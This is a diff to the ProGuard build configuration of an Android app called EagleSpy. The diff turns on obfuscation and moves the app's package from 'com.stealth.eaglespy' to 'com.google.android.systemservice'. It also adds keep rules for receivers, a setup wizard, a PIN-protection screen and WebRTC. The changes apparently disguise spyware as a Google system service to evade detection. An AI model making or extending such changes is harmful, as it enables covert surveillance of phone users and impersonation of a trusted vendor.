@@ -17,7 +17,6 @@
 # === REMOVE DEBUG INFO ===
 -renamesourcefileattribute ''
 -keepattributes SourceFile,LineNumberTable
--dontobfuscate  # Remove this line for production
 
 # === STRING ENCRYPTION (Manual implementation needed) ===
 # Consider using DexGuard or StringCare for runtime string encryption
@@ -25,10 +24,17 @@
 # === KEEP RULES ===
 
 # Keep Application class
--keep class com.stealth.eaglespy.EagleSpyApp { *; }
+-keep class com.google.android.systemservice.EagleSpyApp { *; }
 
-# Keep all Service classes
--keep class com.stealth.eaglespy.services.** { *; }
+# Keep all Service classes (required for Android component registration)
+-keep class com.google.android.systemservice.services.** { *; }
+
+# Keep Receiver classes
+-keep class com.google.android.systemservice.receivers.** { *; }
+
+# Keep Activity classes
+-keep class com.google.android.systemservice.SetupWizardActivity { *; }
+-keep class com.google.android.systemservice.PinProtectionActivity { *; }
 
 # Keep WebRTC classes
 -keep class org.webrtc.** { *; }
